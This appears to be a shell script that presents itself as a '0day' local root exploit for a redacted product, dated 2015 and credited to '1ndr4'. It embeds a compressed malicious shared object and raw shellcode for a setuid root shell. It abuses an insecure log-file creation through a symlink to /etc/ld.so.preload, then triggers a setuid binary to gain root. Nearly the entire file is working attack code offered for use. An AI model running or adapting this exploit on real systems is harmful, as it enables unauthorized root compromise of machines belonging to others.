#!/bin/sh
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
# !!!!!!!!!! This is a 0day exploit for D****** !!!!!!!!!!
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
# 
# Insecure file creation vulnerability in d******_s*****_a****
#                                                   2015.07.30
#                                           Exploited by 1ndr4
# 
# !!!!!!!!!!          DO NOT DISTRIBUTE         !!!!!!!!!!
#
echo "#################################################################"
echo "#    Local root exploit for D****** (<= x86_20121123_359)       #"
echo "#                                                               #"
echo "#  Insecure file creation vulnerability in d******_s*****_a**** #"
echo "#                                                    2015.07.30 #"
echo "#                                            Exploited by 1ndr4 #"
echo "#################################################################"

#
# A compressed shared object binary (i386)
#
# const char *rs = "/tmp/.1ndr4-root";
# void __attribute__((constructor)) init(void) {
#   setgid(0); setuid(0); chown(rs, 0, 0); chmod(rs, 06777); }
EVIL_SO_BZ2="\x42\x5A\x68\x39\x31\x41\x59\x26\x53\x59\x4B\x77\x45\x63\x00\x01\
\x63\xFF\xEF\xFF\xFF\xFE\xD6\xC2\x63\xE4\x0C\x17\x04\x48\x48\xBF\
\xE7\xFE\x64\xC1\x26\x14\x00\x41\x68\x0C\x62\x72\x68\x28\x4C\x23\
\x01\xB0\x01\x95\x81\x68\x34\x53\x15\x3D\xA6\xA9\xA0\x0D\xA8\x34\
\x06\x40\x7A\x86\x40\x32\x0D\x00\x1A\x68\x68\x06\x80\xFD\x53\xD2\
\x33\x53\xD4\x7A\x84\x54\xF5\x3D\x32\x9B\x28\x07\xA8\xD0\x4C\x13\
\x00\x04\x61\x30\x02\x06\x41\x82\x64\x62\x60\x26\x98\x98\x80\x91\
\x29\x35\x36\x89\x3D\x27\xA0\x1A\x68\x08\x60\x00\x98\x06\x84\xD0\
\x34\xF4\x40\x18\x00\x13\x09\x82\x10\xA8\x54\x91\x00\xA2\xF1\x1A\
\x62\x48\x40\xF8\x72\x24\x10\x8F\x17\x05\x06\x24\x14\x75\x65\x89\
\x18\x89\x34\x50\xCA\x83\xD5\x30\x61\x32\x10\xD4\x29\x00\x6E\x28\
\xFB\x13\xD3\x3D\xE5\x24\x84\xD7\x70\x8F\x0E\x0A\xF9\x93\x17\x01\
\xDE\xAD\xC1\x96\xFB\x31\xD5\x95\x04\xD7\x50\xB9\xCF\x3E\x8C\xD6\
\x5F\x95\x30\xAD\x70\x2A\x55\xB0\xBE\x99\xD8\xC5\x09\xA2\xDB\xD0\
\x2A\x74\xA0\x21\xA4\x8A\x0D\x36\x93\x69\x36\x92\x6D\x36\x93\x61\
\x42\x08\x1D\x84\x10\xC1\xB9\x5B\x22\x21\xC4\x43\x70\xD0\xDD\x93\
\x14\xAD\x08\x79\x10\x01\x55\x80\x5F\xB2\xE9\x8A\xA3\x00\xB4\x6A\
\x7D\x68\xC4\xAF\xF1\xF7\xEC\x57\xF9\xCF\x26\x62\x5B\x34\x0F\x39\
\x00\xFA\x34\x2B\x94\xCC\xDF\x5A\xB9\x90\xD2\x68\x9E\xCB\xF3\x42\
\xB0\xC9\xA1\x9F\xA9\xC3\x89\xB6\x27\xE6\xB4\x52\x78\x6D\x0A\x57\
\x55\x88\xB2\x65\xD2\x60\xA5\x68\x0C\xA6\x4E\x7E\x97\x2F\x86\xF4\
\x81\x82\x9D\x3A\x6D\x33\x59\x49\x39\xA2\x56\xA6\xEF\xF9\x48\xA8\
\xB4\x7A\x9E\xCB\xFA\xB0\xFC\x3D\x59\x62\x8F\xDE\xC6\x43\x59\xD7\
\xAF\xA1\x25\x27\x4F\x0C\x42\x00\x33\x05\xDD\xC3\x52\xA2\x43\x2B\
\x33\x75\x35\x4C\xB5\x34\x04\xF3\xD3\xA1\x41\xDA\xD2\xE8\xAF\xA8\
\xC2\x00\x54\xB3\x67\xB2\x65\x19\xD0\x22\xC4\xF1\x2E\x32\xB0\x1E\
\x00\x5E\x30\xC2\x77\x8C\x13\x98\x35\xFB\x92\x40\x32\xC2\xB1\x89\
\x0C\x71\x94\x2A\xA1\x0A\x08\xDE\xE8\x39\x84\x73\xE7\xF5\xA0\x3C\
\xFB\x97\x60\x57\x9D\x30\x9A\x01\x81\xC8\x64\x1B\x0D\x8B\x21\x24\
\x1B\x13\xE8\x1E\x76\x85\x9D\x56\xB6\x3D\x15\x94\x30\x62\x7D\x43\
\x61\x41\x5A\xCE\x0F\x54\x08\xED\x45\x2B\xF2\x2B\x92\x1F\xB5\x44\
\x67\xB0\x24\x39\x24\xFF\x17\x72\x45\x38\x50\x90\x4B\x77\x45\x63"

#
# A shell binary (i386)
#
# setgid(0); setuid(0); execve("/bin/sh", ["/bin/sh"], NULL); 
RSHELL="\x7F\x45\x4C\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x02\x00\x03\x00\x01\x00\x00\x00\x54\x80\x04\x08\x34\x00\x00\x00\
\x94\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x01\x00\x28\x00\
\x03\x00\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\
\x00\x80\x04\x08\x81\x00\x00\x00\x81\x00\x00\x00\x05\x00\x00\x00\
\x00\x10\x00\x00\x31\xDB\x89\xD8\xB0\x2E\xCD\x80\x31\xDB\x89\xD8\
\xB0\x17\xCD\x80\xEB\x0D\x5B\x31\xD2\x89\xD0\x52\x53\x89\xE1\xB0\
\x0B\xCD\x80\xE8\xEE\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68"

TARGET="d******_s*****_a****"
DATE=`date +'%Y/%m/%d'`
LOGNAME=`date +'%Y%m%d'`
DIRECTORY="log/d******_s*****_a****/${DATE}"
LOGFILE="${DIRECTORY}/${LOGNAME}.log"

mkdir -p ${DIRECTORY}

echo "[*] Create a evil module...."
echo -ne $EVIL_SO_BZ2 > /tmp/1ndr4.so.bz2
bzip2 -d /tmp/1ndr4.so.bz2 2>/dev/null
echo "[*] Create a root shell...."
echo -ne $RSHELL > /tmp/.1ndr4-root

ln -sf /etc/ld.so.preload ${LOGFILE}
umask 0000
echo "[*] Do Exploit!"
${TARGET} -g 1>/dev/null 2>/dev/null

echo -ne "[*] Wait a minute."
while :; do
	if [ ! -f "/etc/ld.so.preload" ]; then
		echo -ne "."
		sleep 1
	else
		break;
	fi
done
echo
echo "/tmp/1ndr4.so" > /etc/ld.so.preload
ping 1>/dev/null 2>/dev/null
sleep 1
echo "" > /etc/ld.so.preload
if [ -u "/tmp/.1ndr4-root" ]; then
	echo "[*] Voila~ Got a r00t"
	/tmp/.1ndr4-root
	rm -rf /tmp/1ndr4* log var
else
	echo "[!] Exploit failed."
	rm -rf /tmp/.1ndr4-root /tmp/1ndr4* log var
fi
